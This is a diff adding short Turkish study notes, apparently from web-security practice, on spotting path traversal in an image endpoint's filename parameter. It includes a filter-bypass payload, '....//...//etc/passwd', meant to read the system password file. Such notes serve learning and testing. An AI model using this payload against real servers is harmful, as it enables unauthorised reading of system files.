@@ -18,6 +18,24 @@
 
 
 
+tip# Bir fotoğraf gördüğünde sağ tıkla>kaynağını görüntüle ve img üzerinde path traversal dene
+
+
+Zafiyeti tespit etmek#
+  
+  1#
+    -> GET /image?filename=24.jpg -> 200 OK
+    -> GET /image?filename=../image/24.jpg -> 200 OK -> zafiyetli
+  
+  2#
+    -> GET /image?filename=24.jpg -> 200 OK
+    -> GET /image?filename=../24.jpg -> 200 OK -> demekki "../" kaldırılıyor
+    -> GET /image?filename=....//...//etc/passwd -> payload
+
+
+
+
+
 
 
 
